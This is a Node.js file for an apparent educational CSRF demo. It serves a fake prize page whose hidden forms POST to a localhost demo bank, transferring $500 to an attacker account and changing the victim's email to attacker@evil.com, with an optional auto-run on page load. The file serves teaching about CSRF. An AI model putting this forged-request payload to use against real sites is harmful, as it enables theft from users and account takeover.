/**
 * ============================================================================
 * CSRF EDUCATIONAL DEMO - MALICIOUS SERVER (Attacker's Site)
 * ============================================================================
 * This simulates an attacker's website that exploits CSRF vulnerability.
 * 
 * HOW THE ATTACK WORKS:
 * 1. Victim is logged into MyBank (localhost:3000) - has session cookie
 * 2. Victim visits this malicious site (localhost:3001)
 * 3. This page contains a HIDDEN form that auto-submits to MyBank
 * 4. Victim's browser attaches the MyBank session cookie automatically
 * 5. MyBank processes the request as if the victim intended it
 *
 * THIS IS FOR EDUCATIONAL PURPOSES ONLY - localhost demo
 * ============================================================================
 */

const http = require('http');

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>😈 Totally Legitimate Prize Page</title>
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    max-width: 600px; 
                    margin: 50px auto; 
                    padding: 20px;
                    background: #f0f8ff;
                }
                .prize { 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    padding: 30px;
                    border-radius: 10px;
                    text-align: center;
                    margin: 20px 0;
                }
                .prize h2 { font-size: 2em; margin: 10px 0; }
                .warning {
                    background: #fff3cd;
                    border: 2px solid #ffc107;
                    padding: 15px;
                    border-radius: 5px;
                    margin-top: 20px;
                    display: none; /* Hidden by default, shown via JS for education */
                }
                .attack-log {
                    background: #1a1a2e;
                    color: #00ff88;
                    font-family: 'Courier New', monospace;
                    padding: 15px;
                    border-radius: 5px;
                    margin-top: 20px;
                    font-size: 0.9em;
                    white-space: pre-wrap;
                }
                .btn {
                    background: #ff6b6b;
                    color: white;
                    border: none;
                    padding: 15px 30px;
                    font-size: 1.2em;
                    border-radius: 5px;
                    cursor: pointer;
                    margin: 10px;
                }
                .btn:hover { background: #ee5a5a; }
            </style>
        </head>
        <body>
            <h1>🎉 Congratulations!</h1>
            
            <div class="prize">
                <h2>🎁 YOU WON A FREE PRIZE! 🎁</h2>
                <p>Click below to claim your reward!</p>
                <button class="btn" onclick="claimPrize()">CLAIM PRIZE</button>
            </div>

            <!-- ============================================
                 THE CSRF ATTACK - HIDDEN FORM
                 ============================================
                 This form is INVISIBLE to the user.
                 It submits to the vulnerable MyBank server
                 when the page loads (or when button is clicked).
                 
                 The victim's browser will automatically include
                 their MyBank session cookie with this request!
                 ============================================ -->
            
            <div id="attack-container" style="display: none;">
                <!-- Attack 1: Transfer money to attacker -->
                <form id="csrf-transfer" action="http://localhost:3000/transfer" method="POST">
                    <input type="hidden" name="to" value="attacker_evil_account">
                    <input type="hidden" name="amount" value="500">
                </form>

                <!-- Attack 2: Change victim's email to attacker's email -->
                <form id="csrf-email" action="http://localhost:3000/change-email" method="POST">
                    <input type="hidden" name="email" value="attacker@evil.com">
                </form>
            </div>

            <!-- Educational info panel -->
            <div class="warning" id="edu-panel">
                <h3>🎓 EDUCATIONAL DEMO - What Just Happened?</h3>
                <ol>
                    <li>You were logged into <strong>MyBank</strong> (localhost:3000)</li>
                    <li>You visited this <strong>malicious page</strong> (localhost:3001)</li>
                    <li>This page contained a <strong>hidden form</strong> targeting MyBank</li>
                    <li>Your browser <strong>automatically attached</strong> your MyBank session cookie</li>
                    <li>MyBank received the request with valid cookies and <strong>processed it!</strong></li>
                </ol>
                <p><strong>Result:</strong> $500 was transferred and your email was changed without your consent!</p>
            </div>

            <div class="attack-log" id="log"></div>

            <script>
                // Educational logging
                const log = document.getElementById('log');
                function addLog(msg) {
                    const time = new Date().toLocaleTimeString();
                    log.textContent += '[' + time + '] ' + msg + '\\n';
                }

                addLog('=== CSRF ATTACK DEMONSTRATION ===');
                addLog('Malicious page loaded.');
                addLog('Victim has active session on localhost:3000');
                addLog('Preparing hidden forms...');
                addLog('Target: http://localhost:3000/transfer');
                addLog('Target: http://localhost:3000/change-email');
                addLog('');

                function claimPrize() {
                    addLog('User clicked "CLAIM PRIZE" button');
                    addLog('Triggering CSRF attack...');
                    addLog('');

                    // Show educational panel
                    document.getElementById('edu-panel').style.display = 'block';

                    // Execute the attack - submit hidden forms
                    addLog('Submitting hidden transfer form...');
                    addLog('  -> POST http://localhost:3000/transfer');
                    addLog('  -> to=attacker_evil_account');
                    addLog('  -> amount=500');
                    addLog('  -> Cookies: [session=valid_session_token] (auto-attached!)');
                    
                    document.getElementById('csrf-transfer').submit();

                    // Also change email after a short delay
                    setTimeout(() => {
                        addLog('');
                        addLog('Submitting hidden email change form...');
                        addLog('  -> POST http://localhost:3000/change-email');
                        addLog('  -> email=attacker@evil.com');
                        addLog('  -> Cookies: [session=valid_session_token] (auto-attached!)');
                        
                        document.getElementById('csrf-email').submit();
                    }, 1000);

                    addLog('');
                    addLog('=== ATTACK EXECUTED ===');
                    addLog('Check http://localhost:3000 to see the damage!');
                }

                // Alternative: Auto-execute on page load (even more dangerous!)
                // Uncomment the line below to attack immediately when page loads:
                // window.onload = claimPrize;
            </script>
        </body>
        </html>
    `);
});

const PORT = 3001;
server.listen(PORT, () => {
    console.log('========================================');
    console.log('  CSRF DEMO - Malicious Server');
    console.log('========================================');
    console.log('');
    console.log(`  😈 Malicious site running at: http://localhost:${PORT}`);
    console.log('');
    console.log('  This server demonstrates how CSRF attacks work.');
    console.log('  It is part of an educational demo on localhost only.');
    console.log('');
    console.log('========================================');
});
